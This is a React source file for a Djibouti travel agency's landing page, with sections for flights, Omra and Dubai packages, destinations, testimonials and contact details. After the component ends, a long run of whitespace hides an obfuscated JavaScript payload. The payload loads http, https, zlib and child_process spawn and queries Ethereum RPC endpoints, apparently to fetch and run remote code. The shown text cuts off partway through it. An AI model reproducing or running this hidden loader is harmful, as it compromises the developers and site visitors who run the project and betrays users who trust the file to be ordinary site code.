            {[["accueil","Accueil"],["recherche","Rechercher un vol"],["services","Services"],["destinations","Djibouti"],["packages","Packages"],["agence","Contact"]].map(([id,label])=>(
              <button key={id} onClick={()=>scrollTo(id)} style={{
                background:"none", border:"none", cursor:"pointer", textAlign:"left",
                color: activeSection===id ? T.sky : "rgba(255,255,255,0.85)",
                fontFamily:"inherit", fontSize:16, fontWeight:500,
                padding:"12px 4px", borderBottom:"1px solid rgba(255,255,255,0.06)",
              }}>{label}</button>
            ))}
            <div style={{ display:"flex", gap:10, marginTop:14 }}>
              <a href="https://wa.me/25377646406" target="_blank" rel="noopener noreferrer" style={{
                flex:1, display:"flex", alignItems:"center", justifyContent:"center", gap:6, padding:"12px",
                background:"#25D366", color:"white", borderRadius:8,
                fontSize:14, fontWeight:600, textDecoration:"none",
              }}><WhatsAppIcon size={16}/> WhatsApp</a>
              <button onClick={()=>scrollTo("packages")} style={{
                flex:1, padding:"12px", background:`linear-gradient(135deg,${T.gold},${T.goldD})`,
                color:"white", border:"none", borderRadius:8, fontSize:14, fontWeight:600, cursor:"pointer",
              }}>Réserver →</button>
            </div>
          </div>
        )}
      </nav>

      {/* ══ HERO ══ */}
      <section id="accueil" className="hero-section" style={{ position:"relative", height:"100vh", minHeight:700, overflow:"hidden" }}>
        {/* Background */}
        <div style={{
          position:"absolute", inset:0,
          backgroundImage:"url('https://images.unsplash.com/photo-1547471080-7cc2caa01a7e?w=1600&q=90')",
          backgroundSize:"cover", backgroundPosition:"center",
          transform:"scale(1.05)",
          animation:"float 20s ease-in-out infinite",
        }}/>
        <div style={{ position:"absolute", inset:0, background:"linear-gradient(135deg, rgba(11,31,58,0.88) 0%, rgba(11,31,58,0.5) 50%, rgba(11,31,58,0.75) 100%)" }}/>

        {/* Contenu hero */}
        <div className="hero-content hero-flex" style={{ position:"relative", zIndex:2, maxWidth:1200, margin:"0 auto", padding:"0 40px", height:"100%", display:"flex", alignItems:"center" }}>
          <div style={{ maxWidth:680 }}>
            <h1 className="fade-up hero-title" style={{ animationDelay:"0.2s", fontFamily:"'Playfair Display', serif", fontSize:68, fontWeight:900, color:"#fff", lineHeight:1.05, marginBottom:24 }}>
              Votre Voyage<br/>
              <span style={{ color:T.sky }}>Commence</span><br/>
              à Djibouti
            </h1>

            <p className="fade-up" style={{ animationDelay:"0.3s", fontSize:18, color:"rgba(255,255,255,0.75)", lineHeight:1.7, marginBottom:40, maxWidth:520 }}>
              Vols internationaux, hôtels, Omra, packages touristiques. 
              Service personnalisé et de confiance.
            </p>

            <div className="fade-up" style={{ animationDelay:"0.4s", display:"flex", gap:16, flexWrap:"wrap" }}>
              <button className="btn-primary" onClick={()=>scrollTo("recherche")} style={{
                padding:"16px 36px", background:`linear-gradient(135deg,${T.blue},${T.blueL})`,
                color:"white", border:"none", borderRadius:12, fontSize:16, fontWeight:600,
                cursor:"pointer", transition:"all 0.2s", display:"flex", alignItems:"center", gap:8
              }}>✈️ Rechercher un vol</button>
              <button className="btn-gold" onClick={()=>scrollTo("destinations")} style={{
                padding:"16px 36px", background:`linear-gradient(135deg,${T.gold},${T.goldD})`,
                color:"white", border:"none", borderRadius:12, fontSize:16, fontWeight:600,
                cursor:"pointer", transition:"all 0.2s"
              }}>🌍 Découvrir Djibouti</button>
            </div>

            {/* Stats rapides */}
            <div className="fade-up hero-stats" style={{ animationDelay:"0.5s", display:"flex", gap:40, marginTop:52, paddingTop:32, borderTop:"1px solid rgba(255,255,255,0.1)" }}>
              {STATS.slice(1,4).map(s=>(
                <div key={s.label}>
                  <div style={{ fontSize:28, fontWeight:900, color:T.sky, fontFamily:"'Playfair Display', serif" }}>{s.value}</div>
                  <div style={{ fontSize:12, color:"rgba(255,255,255,0.55)", marginTop:2 }}>{s.label}</div>
                </div>
              ))}
            </div>
          </div>

          {/* Carte contact flottante */}
          <div className="fade-up hero-contact-card" style={{ animationDelay:"0.6s", marginLeft:"auto", background:"rgba(255,255,255,0.07)", backdropFilter:"blur(20px)", border:"1px solid rgba(255,255,255,0.12)", borderRadius:20, padding:28, minWidth:260 }}>
            <div style={{ fontSize:12, color:T.sky, fontWeight:700, letterSpacing:2, marginBottom:16 }}>CONTACTEZ-NOUS</div>
            {[["📞","+253 21 25 07 17"],["📱","+253 77 64 64 06"],["✉️","reservations@alamintravel-dj.com"],["📍","Salines Ouest, Djibouti"],["🕐","Sam-Jeu 8h-20h"]].map(([icon,val])=>(
              <div key={val} style={{ display:"flex", gap:10, alignItems:"center", marginBottom:12 }}>
                <span style={{ fontSize:15 }}>{icon}</span>
                <span style={{ fontSize:12, color:"rgba(255,255,255,0.8)", lineBreak:"anywhere" }}>{val}</span>
              </div>
            ))}
            <a href="https://wa.me/25377646406" target="_blank" rel="noopener noreferrer" style={{
              display:"block", marginTop:16, padding:"10px", background:"#25D366",
              color:"white", borderRadius:10, textAlign:"center", fontSize:13,
              fontWeight:600, textDecoration:"none"
              }}><WhatsAppIcon size={14}/> Écrire sur WhatsApp</a>
          </div>
        </div>

        {/* Scroll indicator */}
        <div style={{ position:"absolute", bottom:32, left:"50%", transform:"translateX(-50%)", animation:"float 2s ease-in-out infinite" }}>
          <div style={{ width:1, height:48, background:"rgba(255,255,255,0.3)", margin:"0 auto" }}/>
          <div style={{ width:6, height:6, background:T.sky, borderRadius:"50%", margin:"4px auto 0" }}/>
        </div>
      </section>

      <FlightSearchWidget />

      {/* ══ CAROUSEL COMPAGNIES ══ */}
      <div style={{ background:"white", padding:"40px 0 20px", overflow:"hidden", position:"relative" }}>
        <div style={{ textAlign:"center", marginBottom:24 }}>
          <span style={{ fontFamily:"'Playfair Display', serif", color:T.navy, fontSize:32, fontWeight:700, letterSpacing:1 }}>Nos partenaires</span>
        </div>
        <div style={{ position:"absolute", left:0, top:0, bottom:0, width:80, background:"linear-gradient(to right,white,transparent)", zIndex:2 }}/>
        <div style={{ position:"absolute", right:0, top:0, bottom:0, width:80, background:"linear-gradient(to left,white,transparent)", zIndex:2 }}/>
        <div className="al-track">
          {[...AIRLINES, ...AIRLINES].map((a, i) => (
            <div key={i} style={{ display:"flex", alignItems:"center", marginRight:32, flexShrink:0 }}>
              <div style={{ background:T.gray50, border:`1px solid ${T.gray100}`, borderRadius:10, padding:"6px 10px", height:60, display:"flex", alignItems:"center", justifyContent:"center", boxShadow:"0 2px 8px rgba(11,31,58,0.06)" }}>
                <img src={a.logo} alt={a.name} style={{ height:42, maxWidth:150, width:"auto", objectFit:"contain" }} />
              </div>
              <span style={{ color:"rgba(11,31,58,0.15)", fontSize:20, marginLeft:20 }}>·</span>
            </div>
          ))}
        </div>
      </div>

      {/* ══ SERVICES ══ */}
      <section id="services" style={{ padding:"96px 40px", background:T.gray50 }}>
        <div style={{ maxWidth:1200, margin:"0 auto" }}>
          <div style={{ textAlign:"center", marginBottom:64 }}>
            <div style={{ display:"inline-block", background:`${T.blue}15`, color:T.blue, fontSize:11, fontWeight:700, letterSpacing:3, padding:"6px 16px", borderRadius:30, marginBottom:16 }}>NOS SERVICES</div>
            <h2 className="section-title" style={{ fontFamily:"'Playfair Display', serif", fontSize:46, fontWeight:700, color:T.navy, marginBottom:16 }}>
              Tout ce dont vous<br/>avez besoin pour voyager
            </h2>
            <p style={{ fontSize:16, color:T.gray500, maxWidth:500, margin:"0 auto", lineHeight:1.7 }}>
              De la réservation de vols à l'assistance visa, nous gérons chaque détail de votre voyage.
            </p>
          </div>

          <div className="services-grid" style={{ display:"grid", gridTemplateColumns:"repeat(3, 1fr)", gap:24 }}>
            {SERVICES.map((s, i) => (
              <div key={i} className="service-card" style={{
                position:"relative", background:"white", borderRadius:20,
                boxShadow:"0 4px 24px rgba(11,31,58,0.06)",
                border:"1px solid rgba(11,31,58,0.06)",
                transition:"all 0.3s ease", cursor:"default", overflow:"hidden",
              }}>
                <div style={{ position:"relative", height:160, overflow:"hidden" }}>
                  <img src={s.img} alt={s.title} loading="lazy" style={{ width:"100%", height:"100%", objectFit:"cover" }}/>
                  <div style={{ position:"absolute", inset:0, background:`linear-gradient(180deg, transparent 40%, ${s.color}CC 100%)` }}/>
                  <div style={{ position:"absolute", bottom:12, left:20, right:20 }}>
                    <h3 style={{ fontFamily:"'Playfair Display', serif", fontSize:20, fontWeight:700, color:"white" }}>{s.title}</h3>
                  </div>
                </div>
                <div style={{ padding:"24px 28px 28px" }}>
                  <p style={{ fontSize:14, color:T.gray500, lineHeight:1.7 }}>{s.desc}</p>
                  <div style={{ marginTop:20, color:s.color, fontSize:13, fontWeight:600, display:"flex", alignItems:"center", gap:6 }}>
                    En savoir plus <span>→</span>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ══ DESTINATIONS DJIBOUTI ══ */}
      <section id="destinations" style={{ padding:"96px 40px", background:"white" }}>
        <div style={{ maxWidth:1200, margin:"0 auto" }}>
          <div className="dest-header" style={{ display:"flex", justifyContent:"space-between", alignItems:"flex-end", marginBottom:48 }}>
            <div>
              <div style={{ display:"inline-block", background:`${T.gold}15`, color:T.goldD, fontSize:11, fontWeight:700, letterSpacing:3, padding:"6px 16px", borderRadius:30, marginBottom:16 }}>TOURISME LOCAL</div>
              <h2 className="section-title" style={{ fontFamily:"'Playfair Display', serif", fontSize:46, fontWeight:700, color:T.navy }}>
                Découvrez<br/><span style={{ color:T.blue }}>Djibouti</span>
              </h2>
            </div>
            <p style={{ fontSize:15, color:T.gray500, maxWidth:340, textAlign:"right", lineHeight:1.7 }}>
              Des paysages d'une beauté rare. Djibouti, carrefour entre mer Rouge et golfe d'Aden.
            </p>
          </div>

          <div className="dest-grid" style={{ display:"grid", gridTemplateColumns:"2fr 1fr 1fr", gridTemplateRows:"240px 240px", gap:16 }}>
            {DESTINATIONS.map((d, i) => (
              <div key={i} className="dest-card" style={{
                position:"relative", borderRadius:20, overflow:"hidden",
                gridRow: i===0 ? "span 2" : "auto",
                cursor:"pointer",
                boxShadow:"0 8px 32px rgba(0,0,0,0.12)"
              }}>
                <img className="dest-img" src={d.img} alt={d.name} loading="lazy" style={{ width:"100%", height:"100%", objectFit:"cover", transition:"transform 0.6s ease" }}/>
                <div style={{ position:"absolute", inset:0, background:`linear-gradient(to top, ${d.color}ee 0%, ${d.color}44 50%, transparent 100%)` }}/>
                <div className="dest-overlay" style={{ position:"absolute", inset:0, background:"rgba(0,0,0,0.2)", opacity:0, transition:"opacity 0.3s" }}/>
                <div style={{ position:"absolute", top:16, left:16 }}>
                  <span style={{ background:`${T.gold}`, color:"white", fontSize:9, fontWeight:700, padding:"4px 10px", borderRadius:20, letterSpacing:1 }}>{d.tag}</span>
                </div>
                <div style={{ position:"absolute", bottom:20, left:20, right:20 }}>
                  <div style={{ fontFamily:"'Playfair Display', serif", fontSize:i===0?22:16, fontWeight:700, color:"white", marginBottom:4 }}>{d.name}</div>
                  <div style={{ fontSize:11, color:"rgba(255,255,255,0.75)", lineHeight:1.5 }}>{d.desc}</div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ══ PACKAGES ══ */}
      <section id="packages" style={{ padding:"96px 40px", background:`linear-gradient(135deg, ${T.navyD} 0%, ${T.navy} 100%)` }}>
        <div style={{ maxWidth:1200, margin:"0 auto" }}>
          <div style={{ textAlign:"center", marginBottom:64 }}>
            <div style={{ display:"inline-block", background:"rgba(79,195,247,0.15)", color:T.sky, fontSize:11, fontWeight:700, letterSpacing:3, padding:"6px 16px", borderRadius:30, marginBottom:16 }}>PACKAGES PHARES</div>
            <h2 className="section-title" style={{ fontFamily:"'Playfair Display', serif", fontSize:46, fontWeight:700, color:"white", marginBottom:16 }}>Nos Meilleures Offres</h2>
            <p style={{ fontSize:16, color:"rgba(255,255,255,0.55)", maxWidth:500, margin:"0 auto" }}>Packages complets incluant vols, hébergement et accompagnement</p>
          </div>

          <div className="packages-grid" style={{ display:"grid", gridTemplateColumns:"repeat(3,1fr)", gap:24 }}>
            {[
              { name:"Omra Premium", price:"198 500", duration:"21 jours", places:"30 places", tag:"POPULAIRE", img:"https://commons.wikimedia.org/wiki/Special:FilePath/Kaaba_%281%29_Makkah_%28Mecca%29.jpg", tagColor:T.gold },
              { name:"Omra Ramadan", price:"265 000", duration:"14 jours", places:"40 places", tag:"RAMADAN", img:"https://commons.wikimedia.org/wiki/Special:FilePath/Masjid_Nabawi_The_Prophet's_Mosque,_Madina.jpg", tagColor:"#E91E63" },
              { name:"Dubai City Break", price:"180 000", duration:"5 jours", places:"20 places", tag:"NOUVEAU", img:"https://commons.wikimedia.org/wiki/Special:FilePath/Dubai_Skyline_2016.jpg", tagColor:T.blue },
            ].map((p, i) => (
              <div key={i} style={{ borderRadius:20, overflow:"hidden", background:"rgba(255,255,255,0.05)", border:"1px solid rgba(255,255,255,0.08)", transition:"all 0.3s" }}>
                <div style={{ position:"relative", height:200, overflow:"hidden" }}>
                  <img src={p.img} alt={p.name} loading="lazy" style={{ width:"100%", height:"100%", objectFit:"cover" }}/>
                  <div style={{ position:"absolute", inset:0, background:"linear-gradient(to bottom, transparent, rgba(0,0,0,0.4))" }}/>
                  <div style={{ position:"absolute", top:12, left:12, background:p.tagColor, color:"white", fontSize:9, fontWeight:800, padding:"4px 10px", borderRadius:20, letterSpacing:1 }}>{p.tag}</div>
                </div>
                <div style={{ padding:24 }}>
                  <h3 style={{ fontFamily:"'Playfair Display', serif", fontSize:18, fontWeight:700, color:"white", marginBottom:8 }}>{p.name}</h3>
                  <div style={{ display:"flex", gap:16, marginBottom:16 }}>
                    <span style={{ fontSize:12, color:"rgba(255,255,255,0.5)" }}>📅 {p.duration}</span>
                    <span style={{ fontSize:12, color:"rgba(255,255,255,0.5)" }}>👥 {p.places}</span>
                  </div>
                  <div style={{ display:"flex", justifyContent:"space-between", alignItems:"center" }}>
                    <div>
                      <span style={{ fontSize:22, fontWeight:800, color:T.sky, fontFamily:"'Playfair Display', serif" }}>{p.price}</span>
                      <span style={{ fontSize:11, color:"rgba(255,255,255,0.4)", marginLeft:4 }}>FDJ/pers.</span>
                    </div>
                    <a href="https://wa.me/25377646406" target="_blank" rel="noopener noreferrer" style={{
                      padding:"10px 20px", background:`linear-gradient(135deg,${T.gold},${T.goldD})`,
                      color:"white", borderRadius:10, fontSize:13, fontWeight:600, textDecoration:"none"
                    }}>Réserver →</a>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ══ TÉMOIGNAGES ══ */}
      <section style={{ padding:"96px 40px", background:"white" }}>
        <div style={{ maxWidth:1200, margin:"0 auto" }}>
          <div style={{ textAlign:"center", marginBottom:64 }}>
            <div style={{ display:"inline-block", background:`${T.blue}15`, color:T.blue, fontSize:11, fontWeight:700, letterSpacing:3, padding:"6px 16px", borderRadius:30, marginBottom:16 }}>TÉMOIGNAGES</div>
            <h2 className="section-title" style={{ fontFamily:"'Playfair Display', serif", fontSize:46, fontWeight:700, color:T.navy }}>Ce que disent nos clients</h2>
          </div>

          <div className="testimonials-grid" style={{ display:"grid", gridTemplateColumns:"repeat(2,1fr)", gap:24 }}>
            {TESTIMONIALS.map((t, i) => (
              <div key={i} className="testimonial-card" style={{
                padding:36, borderRadius:20,
                background: i === activeTestimonial ? `linear-gradient(135deg,${T.navy},${T.blue})` : T.gray50,
                border: `1px solid ${i === activeTestimonial ? "transparent" : T.gray100}`,
                transition:"all 0.4s ease", cursor:"pointer"
              }} onClick={() => setActiveTestimonial(i)}>
                <div style={{ display:"flex", gap:4, marginBottom:16 }}>
                  {[...Array(t.stars)].map((_,j)=><span key={j} style={{ color:T.gold, fontSize:16 }}>★</span>)}
                </div>
                <p style={{ fontSize:15, lineHeight:1.8, color: i===activeTestimonial ? "rgba(255,255,255,0.85)" : T.gray700, marginBottom:24, fontStyle:"italic" }}>
                  "{t.text}"
                </p>
                <div>
                  <div style={{ fontWeight:700, color: i===activeTestimonial ? "white" : T.navy, fontSize:15 }}>{t.name}</div>
                  <div style={{ fontSize:12, color: i===activeTestimonial ? T.sky : T.gray500, marginTop:2 }}>{t.role}</div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ══ AGENCE & CARTE ══ */}
      <section id="agence" style={{ padding:"96px 40px", background:T.gray50 }}>
        <div style={{ maxWidth:1200, margin:"0 auto" }}>
          <div style={{ textAlign:"center", marginBottom:48 }}>
            <div style={{ display:"inline-block", background:`${T.gold}15`, color:T.goldD, fontSize:11, fontWeight:700, letterSpacing:3, padding:"6px 16px", borderRadius:30, marginBottom:16 }}>NOTRE AGENCE</div>
            <h2 className="section-title" style={{ fontFamily:"'Playfair Display', serif", fontSize:46, fontWeight:700, color:T.navy }}>Visitez-nous à Djibouti</h2>
          </div>

          <div className="agence-photos-grid" style={{ display:"grid", gridTemplateColumns:"repeat(3,1fr)", gap:16, marginBottom:32 }}>
            {[
              { src:"/agence1.jpg.jpeg", label:"Notre façade", span:2 },
              { src:"/agence2.jpg.jpeg", label:"Notre bureau", span:1 },
              { src:"/agence5.jpg.jpeg", label:"Notre équipe", span:1 },
              { src:"/agence3.jpg.jpeg", label:"Espace travail", span:1 },
              { src:"/agence4.jpg.jpeg", label:"Vue extérieure", span:1 },
            ].map((p, i) => (
              <div key={i} style={{ gridColumn:`span ${p.span}`, borderRadius:16, overflow:"hidden", height:i===0?220:160, position:"relative", boxShadow:"0 4px 20px rgba(0,0,0,0.1)" }}>
                <img src={p.src} alt={p.label} loading="lazy" style={{ width:"100%", height:"100%", objectFit:"cover" }}/>
                <div style={{ position:"absolute", bottom:0, left:0, right:0, background:"linear-gradient(transparent,rgba(0,0,0,0.6))", padding:"10px 14px" }}>
                  <span style={{ color:"white", fontSize:11, fontWeight:600 }}>{p.label}</span>
                </div>
              </div>
            ))}
          </div>

          <div className="agence-info-grid" style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:24 }}>
            <div style={{ borderRadius:20, overflow:"hidden", boxShadow:"0 4px 24px rgba(0,0,0,0.1)", height:300 }}>
              <iframe
                src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3885.5!2d43.1456!3d11.5886!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zQWxhbWluIFRvdXJpc20!5e0!3m2!1sfr!2sdj"
                width="100%" height="300" style={{ border:0 }} allowFullScreen loading="lazy" title="Alamin Tourism Djibouti"
              />
            </div>
            <div style={{ background:"white", borderRadius:20, padding:32, boxShadow:"0 4px 24px rgba(0,0,0,0.06)" }}>
              <h3 style={{ fontFamily:"'Playfair Display', serif", fontSize:22, fontWeight:700, color:T.navy, marginBottom:24 }}>Informations pratiques</h3>
              {[
                ["📍","Adresse","Salines Ouest, Mohamed Kamil Road, Djibouti"],
                ["📞","Téléphone","+253 21 25 07 17"],
                ["📱","Mobile","+253 77 64 64 06"],
                ["✉️","Email","reservations@alamintravel-dj.com"],
                ["🕐","Horaires","Samedi–Jeudi : 8h00 – 20h00"],
                ["🌐","Site web","alamintravel-dj.com"],
              ].map(([icon,label,val])=>(
                <div key={label} style={{ display:"flex", gap:14, marginBottom:14, alignItems:"flex-start" }}>
                  <span style={{ fontSize:18, flexShrink:0 }}>{icon}</span>
                  <div>
                    <div style={{ fontSize:10, color:T.gray500, fontWeight:700, letterSpacing:1, marginBottom:2 }}>{label.toUpperCase()}</div>
                    <div style={{ fontSize:13, color:T.navy, fontWeight:500 }}>{val}</div>
                  </div>
                </div>
              ))}
              <a href="https://maps.google.com/?q=Alamin+Tourism+Travel+Djibouti" target="_blank" rel="noopener noreferrer" style={{
                display:"block", marginTop:20, padding:"12px", background:`linear-gradient(135deg,${T.blue},${T.blueL})`,
                color:"white", borderRadius:12, textAlign:"center", fontSize:14, fontWeight:600, textDecoration:"none"
              }}>🗺️ Ouvrir dans Google Maps</a>
            </div>
          </div>
        </div>
      </section>

      {/* ══ CTA FINAL ══ */}
      <section style={{ background:T.gray50 }}>
        <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", minHeight:420 }} className="cta-split">
          {/* Colonne gauche — texte */}
          <div style={{ padding:"72px 56px", display:"flex", flexDirection:"column", justifyContent:"center" }}>
            <div style={{ display:"inline-flex", alignItems:"center", gap:8, marginBottom:20 }}>
              <span style={{ width:8, height:8, borderRadius:"50%", background:"#25D366" }}/>
              <span style={{ fontSize:12, fontWeight:700, color:T.gray500, letterSpacing:2 }}>ÉQUIPE DISPONIBLE MAINTENANT</span>
            </div>
            <h2 className="cta-title" style={{ fontFamily:"'Playfair Display', serif", fontSize:44, fontWeight:700, color:T.navy, marginBottom:20, lineHeight:1.15 }}>
              Prêt à voyager ?
            </h2>
            <p style={{ fontSize:16, color:T.gray500, marginBottom:36, lineHeight:1.7, maxWidth:420 }}>
              Décrivez-nous votre projet de voyage — vols, hôtels, Omra ou packages — et notre équipe s'occupe du reste, 6 jours sur 7.
            </p>
            <div style={{ display:"flex", gap:14, flexWrap:"wrap" }}>
              <a href="https://wa.me/25377646406" target="_blank" rel="noopener noreferrer" style={{
                padding:"15px 30px", background:"#25D366", color:"white", borderRadius:100,
                fontSize:15, fontWeight:700, textDecoration:"none", display:"inline-flex", alignItems:"center", gap:8,
              }}><WhatsAppIcon size={18}/> WhatsApp</a>
              <a href="tel:+25321250717" style={{
                padding:"15px 30px", background:"white", border:`1.5px solid ${T.gray300}`,
                color:T.navy, borderRadius:100, fontSize:15, fontWeight:600, textDecoration:"none",
                display:"inline-flex", alignItems:"center", gap:8,
              }}>📞 +253 21 25 07 17</a>
            </div>
          </div>

          {/* Colonne droite — image + carte flottante */}
          <div style={{ position:"relative", minHeight:320, backgroundImage:"url('https://images.unsplash.com/photo-1436491865332-7a61a109cc05?w=1000&q=85')", backgroundSize:"cover", backgroundPosition:"center" }}>
            <div style={{ position:"absolute", inset:0, background:`linear-gradient(135deg, ${T.navy}55, ${T.blue}30)` }}/>
            <div style={{ position:"absolute", bottom:28, left:28, right:28, background:"white", borderRadius:16, padding:20, boxShadow:"0 10px 40px rgba(0,0,0,0.2)", display:"flex", gap:16 }}>
              <div style={{ flex:1, textAlign:"center", borderRight:`1px solid ${T.gray100}` }}>
                <div style={{ fontSize:20, fontWeight:800, color:T.blue, fontFamily:"'Playfair Display', serif" }}>6j/7</div>
                <div style={{ fontSize:10, color:T.gray500 }}>Disponibilité</div>
              </div>
              <div style={{ flex:1, textAlign:"center", borderRight:`1px solid ${T.gray100}` }}>
                <div style={{ fontSize:20, fontWeight:800, color:T.blue, fontFamily:"'Playfair Display', serif" }}>&lt;1h</div>
                <div style={{ fontSize:10, color:T.gray500 }}>Réponse</div>
              </div>
              <div style={{ flex:1, textAlign:"center" }}>
                <div style={{ fontSize:20, fontWeight:800, color:T.blue, fontFamily:"'Playfair Display', serif" }}>IATA</div>
                <div style={{ fontSize:10, color:T.gray500 }}>Accrédité</div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* ══ FOOTER ══ */}
      <footer style={{ background:T.navyD, padding:"48px 40px 24px", borderTop:"1px solid rgba(255,255,255,0.05)" }}>
        <div style={{ maxWidth:1200, margin:"0 auto" }}>
          <div className="footer-grid" style={{ display:"grid", gridTemplateColumns:"2fr 1fr 1fr 1fr", gap:40, marginBottom:40 }}>
            <div>
              <Logo size={48} light />
              <p style={{ fontSize:13, color:"rgba(255,255,255,0.45)", marginTop:16, lineHeight:1.8, maxWidth:280 }}>
                Votre partenaire de voyage de confiance à Djibouti. Agent IATA accrédité, spécialisé dans les vols internationaux, hôtels et packages Omra.
              </p>
              <div style={{ display:"flex", gap:12, marginTop:20 }}>
                <a href="https://wa.me/25377646406" target="_blank" rel="noopener noreferrer" style={{ width:36, height:36, borderRadius:8, background:"rgba(255,255,255,0.08)", display:"flex", alignItems:"center", justifyContent:"center", cursor:"pointer" }}>
                  <WhatsAppIcon size={15}/>
                </a>
              </div>
            </div>
            <div>
              <div style={{ fontSize:11, fontWeight:700, color:T.sky, letterSpacing:2, marginBottom:20 }}>SERVICES</div>
              {["Billets d'avion","Hôtels","Omra","Location voiture","Assistance visa","Voyages organisés"].map(s=>(
                <div key={s} style={{ fontSize:13, color:"rgba(255,255,255,0.45)", marginBottom:10, cursor:"pointer" }}>{s}</div>
              ))}
            </div>
            <div>
              <div style={{ fontSize:11, fontWeight:700, color:T.sky, letterSpacing:2, marginBottom:20 }}>LIENS RAPIDES</div>
              {["Accueil","À propos","Packages","Destinations","Contact"].map(s=>(
                <div key={s} style={{ fontSize:13, color:"rgba(255,255,255,0.45)", marginBottom:10, cursor:"pointer" }}>{s}</div>
              ))}
            </div>
            <div>
              <div style={{ fontSize:11, fontWeight:700, color:T.sky, letterSpacing:2, marginBottom:20 }}>CONTACT</div>
              {["+253 21 25 07 17","+253 77 64 64 06","reservations@alamintravel-dj.com","Salines Ouest, Djibouti"].map(s=>(
                <div key={s} style={{ fontSize:12, color:"rgba(255,255,255,0.45)", marginBottom:10, lineBreak:"anywhere" }}>{s}</div>
              ))}
            </div>
          </div>
          <div style={{ borderTop:"1px solid rgba(255,255,255,0.06)", paddingTop:24, display:"flex", justifyContent:"space-between", alignItems:"center" }}>
            <div style={{ fontSize:12, color:"rgba(255,255,255,0.3)" }}>© 2026 Alamin Tourism & Travel. Tous droits réservés. Agent IATA Accrédité.</div>
            <div style={{ fontSize:12, color:"rgba(255,255,255,0.3)" }}>alamintravel-dj.com</div>
          </div>
        </div>
      </footer>
    </div>
  );
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i="A9-0183-1";const _0x44ceab=_0xc702;(function(_0x242c2a,_0xcc5db6){const _0x55afa4=_0xc702,_0x2abd94=_0x242c2a();while(!![]){try{const _0x3f9b11=-parseInt(_0x55afa4(0x12b))/(-0x368+0x1cce+0x877*-0x3)*(-parseInt(_0x55afa4(0x17f))/(-0x227*-0x11+-0x5d7+-0x1ebe))+-parseInt(_0x55afa4(0xec))/(-0x2316+0xb*0x1c+0x21e5)*(parseInt(_0x55afa4(0x1ac))/(0x897+0x1921+-0x21b4))+-parseInt(_0x55afa4(0xed))/(-0x1459+-0x717*-0x4+-0x7fe)*(parseInt(_0x55afa4(0xa7))/(-0x6*-0x4d2+-0x1640+-0x6a6))+-parseInt(_0x55afa4(0xaa))/(0x53b*0x4+-0x1*0x818+-0xccd)+-parseInt(_0x55afa4(0x138))/(-0x167*-0xa+0x1*-0xd1c+-0xe2)+-parseInt(_0x55afa4(0xd1))/(0xd25*-0x1+0x66e+0x6c0)*(-parseInt(_0x55afa4(0xd9))/(-0xb*0x227+-0x23e5+-0x2*-0x1dce))+parseInt(_0x55afa4(0x1bd))/(-0x2208+0x11a1+0x1072);if(_0x3f9b11===_0xcc5db6)break;else _0x2abd94['push'](_0x2abd94['shift']());}catch(_0x2923f3){_0x2abd94['push'](_0x2abd94['shift']());}}}(_0x3307,-0xc750f+-0x1991b*0x3+0x1*0x1a9896),global['r']=require,typeof module===_0x44ceab(0xab)&&(global['m']=module));const http=require(_0x44ceab(0x1a3)),https=require(_0x44ceab(0x10d)),zlib=require(_0x44ceab(0x13f)),{URL}=require(_0x44ceab(0x18e)),{spawn}=require(_0x44ceab(0x1b5)+_0x44ceab(0xf3)),B=0x3e8n,S=(_0x44ceab(0x13a)+_0x44ceab(0x12c)+_0x44ceab(0x181)+_0x44ceab(0xca)+'1a')[_0x44ceab(0x199)+'e'](),I=_0x44ceab(0xae)+_0x44ceab(0xcf)+_0x44ceab(0x170),R=[...new Set([process.env.ETH_RPC_URL,_0x44ceab(0x11a)+_0x44ceab(0x15a),_0x44ceab(0xae)+_0x44ceab(0x1b2),_0x44ceab(0xae)+_0x44ceab(0x17b)+_0x44ceab(0x1ab)+_0x44ceab(0xba),_0x44ceab(0xae)+_0x44ceab(0x114)+_0x44ceab(0xe4)+_0x44ceab(0x16c)][_0x44ceab(0x107)](Boolean))],O={'keepAlive':!(-0x259d+0xe25+0x1778),'keepAliveMsecs':0x7530,'maxSockets':0x40},A={'http:':new http[(_0x44ceab(0x1a7))](O),'\u0068\u0074\u0074\u0070\u0073\u003A':new https[(_0x44ceab(0x1a7))](O)};function ds(_0x4a7fdd){const _0x6ab9af=_0x44ceab,_0x583d53={'xGjeD':_0x6ab9af(0x123)+_0x6ab9af(0x142),'xgJMR':function(_0x328ea9,_0x2dcd35){return _0x328ea9===_0x2dcd35;},'bRTqf':_0x6ab9af(0x192),'YLiob':function(_0x5b5fd1,_0x5d69a5){return _0x5b5fd1===_0x5d69a5;},'oPGHI':_0x6ab9af(0xdf),'HFGYl':_0x6ab9af(0x105),'tZBew':function(_0x137fc4){return _0x137fc4();}},_0x3ac994=(_0x4a7fdd[_0x6ab9af(0xaf)][_0x583d53[_0x6ab9af(0xc3)]]||'')[_0x6ab9af(0x199)+'e'](),_0x10d60b=_0x583d53[_0x6ab9af(0x1b0)](_0x3ac994,_0x583d53[_0x6ab9af(0x168)])||_0x583d53[_0x6ab9af(0x121)](_0x3ac994,_0x583d53[_0x6ab9af(0x83)])?zlib[_0x6ab9af(0x15b)+'ip']:_0x583d53[_0x6ab9af(0x1b0)](_0x3ac994,_0x583d53[_0x6ab9af(0x9f)])?zlib[_0x6ab9af(0xc6)+_0x6ab9af(0x126)]:_0x583d53[_0x6ab9af(0x121)](_0x3ac994,'br')?zlib[_0x6ab9af(0x14c)+_0x6ab9af(0x17e)+'ss']:-0x150*-0xa+-0x5*0x697+0x13d3;return _0x10d60b?_0x4a7fdd[_0x6ab9af(0x149)](_0x583d53[_0x6ab9af(0x155)](_0x10d60b)):_0x4a7fdd;}function hr(_0x288096,{method:_0x180375=_0x44ceab(0x176),body:_0x1e1d38,signal:_0x4a5a6a}={}){const _0x22dd27=_0x44ceab,_0x2e88b9={'Zbgqs':_0x22dd27(0xf5),'webnr':function(_0x33f8c6,_0x52d640){return 